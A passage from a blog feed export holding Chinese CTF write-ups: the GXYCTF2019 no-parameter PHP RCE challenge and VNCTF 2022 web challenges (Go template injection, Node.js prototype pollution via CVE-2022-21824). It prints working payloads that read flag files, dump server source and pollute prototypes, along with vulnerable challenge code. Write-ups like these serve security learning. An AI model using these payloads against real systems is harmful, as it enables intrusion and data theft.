      <title>GXYCTF2019 禁止套娃 1题解</title>
      <link href="/2022/02/23/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/23/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="GXYCTF2019-禁止套娃-1题解"><a href="#GXYCTF2019-禁止套娃-1题解" class="headerlink" title="GXYCTF2019 禁止套娃 1题解"></a>GXYCTF2019 禁止套娃 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h3><p>之前找的大部分都是python2的，自己改了半天没改好，发现有现成的，呜呜呜。<br><a href="https://github.com/tigert1998/GitHack-py3">python3编写的githack</a></p><h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p><a href="https://kingofkb.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-RCE_No_Para%E5%A4%8D%E7%8E%B0/">https://kingofkb.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-RCE_No_Para%E5%A4%8D%E7%8E%B0/</a></p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>首先dirsearch扫目录，发现</p><pre class=" language-1"><code class="language-1">429   568B   http://3325673f-8741-4b3b-8c0a-ed258e6f5d97.node4.buuoj.cn:81/.git/</code></pre><p>是git源码泄露，用githack扫出index.php的源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span><span class="token delimiter">?></span></code></pre><p>首先第一个判断</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>是ban了一些伪协议之类的东西。<br>第二个判断</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>无参数RCE写法，只能匹配a(b())。<br>第三个判断</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ban了一些函数。<br>按照一般payload</p><pre class=" language-1"><code class="language-1">?exp=var_dump(get_defined_vars);&b=1</code></pre><p>但是get被ban掉了，想办法绕过，这时候选择localeconv()函数加scandir()函数绕过，我们知道scandir()可以列出当前目录，同时，localeconv()的第一位必定是.，利用current取出，构造</p><pre class=" language-1"><code class="language-1">?exp=var_dump(scandir(current(localeconv())));&b=1回显:array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" } </code></pre><p>找到flag.php，想办法取出，构造</p><pre><code>?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));&amp;b=1回显:string(8) "flag.php" </code></pre><p>最后，构造</p><pre class=" language-1"><code class="language-1">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));&b=1回显:<?php$flag = "flag{eb31631a-9e07-42dd-a0ba-fbdcdb2a86a4}";?> </code></pre><p>得到flag:flag{eb31631a-9e07-42dd-a0ba-fbdcdb2a86a4}</p><p>参考：<br><a href="https://www.cnblogs.com/zzjdbk/p/13720677.html">https://www.cnblogs.com/zzjdbk/p/13720677.html</a><br><a href="https://blog.csdn.net/qq_42812036/article/details/104406481">https://blog.csdn.net/qq_42812036/article/details/104406481</a><br><a href="https://blog.csdn.net/cainiao17441898/article/details/117158702">https://blog.csdn.net/cainiao17441898/article/details/117158702</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> .git源码泄露 无参数RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-web复现</title>
      <link href="/2022/02/18/VNCTF-web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/02/18/VNCTF-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="VNCTF-web复现"><a href="#VNCTF-web复现" class="headerlink" title="VNCTF-web复现"></a>VNCTF-web复现</h1><h2 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h2><p>在/js/data.js最后有一个base64加密的文本，解码得到flag:VNCTF{Welcome_to_VNCTF2022}</p><h2 id="gocal0"><a href="#gocal0" class="headerlink" title="gocal0"></a>gocal0</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="go"><a href="#go" class="headerlink" title="go"></a>go</h4><p><a href="https://www.runoob.com/go/go-tutorial.html">go菜鸟教程</a></p><h4 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h4><p>不知道这个题目具体是哪种，等完了有时间把SSTI注入整理一下。（大坑）</p><h3 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h3><p>打开题目环境，有flag，进入，提示flag在session中。<br>同时在输入框中，无论输入什么都正常回显，猜测SSTI注入，利用{ {printf “%+v” .} }直接获取源码。<br>手动对齐了一下。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token boolean">_</span> <span class="token string">"embed"</span>     <span class="token string">"fmt"</span>     <span class="token string">"os"</span>     <span class="token string">"reflect"</span>     <span class="token string">"strings"</span>     <span class="token string">"text/template"</span>     <span class="token string">"github.com/gin-contrib/sessions"</span>     <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>     <span class="token string">"github.com/gin-gonic/gin"</span>     <span class="token string">"github.com/maja42/goval"</span>     <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//go:embed template/index.html var tpl string </span><span class="token comment" spellcheck="true">//go:embed main.go var source string type Eval struct { E string `json:"e" form:"e" binding:"required"` } </span><span class="token keyword">func</span> <span class="token punctuation">(</span>e Eval<span class="token punctuation">)</span> <span class="token function">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     eval <span class="token operator">:=</span> goval<span class="token punctuation">.</span><span class="token function">NewEvaluator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> result<span class="token punctuation">,</span> err <span class="token operator">:=</span> eval<span class="token punctuation">.</span><span class="token function">Evaluate</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>E<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err     <span class="token punctuation">}</span>     t <span class="token operator">:=</span> reflect<span class="token punctuation">.</span><span class="token function">ValueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> t <span class="token operator">==</span> reflect<span class="token punctuation">.</span>Int <span class="token punctuation">{</span>         <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token keyword">if</span> t <span class="token operator">==</span> reflect<span class="token punctuation">.</span>String <span class="token punctuation">{</span>         <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"not valid type"</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">func</span> <span class="token punctuation">(</span>e Eval<span class="token punctuation">)</span> <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>     res<span class="token punctuation">,</span> err <span class="token operator">:=</span> e<span class="token punctuation">.</span><span class="token function">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>         fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>         res <span class="token operator">=</span> <span class="token string">"invalid"</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s = %s"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>E<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token keyword">func</span> <span class="token function">render</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>     session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">var</span> his <span class="token builtin">string</span>     <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>         his <span class="token operator">=</span> <span class="token string">""</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>         his <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> <span class="token string">"{{result}}"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span><span class="token punctuation">)</span> t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> <span class="token string">"{{result}}"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>         fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>         c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"internal error"</span><span class="token punctuation">)</span>         <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span> err <span class="token operator">:=</span> t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span> <span class="token string">"s0uR3e"</span><span class="token punctuation">:</span> source<span class="token punctuation">,</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     port <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>         port <span class="token operator">=</span> <span class="token string">"8080"</span>     <span class="token punctuation">}</span>     r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"woW_you-g0t_sourcE_co6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">render</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>         session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>         session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"flag is in your session"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>         session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">var</span> his <span class="token builtin">string</span>         <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> his <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">}</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span> his <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>         eval <span class="token operator">:=</span> Eval<span class="token punctuation">{</span><span class="token punctuation">}</span>         <span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>eval<span class="token punctuation">)</span><span class="token punctuation">;</span>         err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> his <span class="token operator">=</span> his <span class="token operator">+</span> eval<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">}</span>         session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">render</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>     r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> </code></pre><p>WP中写本地启动一个一样的就可以，把官方WP放下面，我自己在本地试的时候go环境没调好，完了再补</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token boolean">_</span> <span class="token string">"embed"</span>    <span class="token string">"fmt"</span>    <span class="token string">"os"</span>    <span class="token string">"github.com/gin-contrib/sessions"</span>    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    port <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>    port <span class="token operator">=</span> <span class="token string">"8080"</span>    <span class="token punctuation">}</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"woW_you-g0t_sourcE_co6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token function">println</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>补充一种超级非预期，出题人疏忽忘记加密cookie，直接对session进行base64解码（注意用hackbar，我用的网站是解不出来的），解完之后找出像base64加密的地方再解码，得到flag:flag{36ad49a5-a9f3-4ea6-9a61-04a17a418586}</p><h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="原链型污染"><a href="#原链型污染" class="headerlink" title="原链型污染"></a>原链型污染</h4><p><a href="https://nodejs.org/zh-cn/blog/vulnerability/jan-2022-security-releases/">CVE-2022-21824</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21824">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21824</a></p><h3 id="题目详解-1"><a href="#题目详解-1" class="headerlink" title="题目详解"></a>题目详解</h3><p>官方payload</p><pre class=" language-1"><code class="language-1">console.table([{a:1}],['__proto__'])</code></pre><p>输入后直接访问/flag，获得flag:flag{db24dccc-dd0f-4734-b6d0-ca7a7dc2dbf6}</p><p>打开环境，进入source得到源码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> vm2 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm2<span class="token punctuation">.</span>NodeVM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/eval"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> e <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"wrong?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">"module.exports="</span><span class="token operator">+</span>e<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"wrong?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span 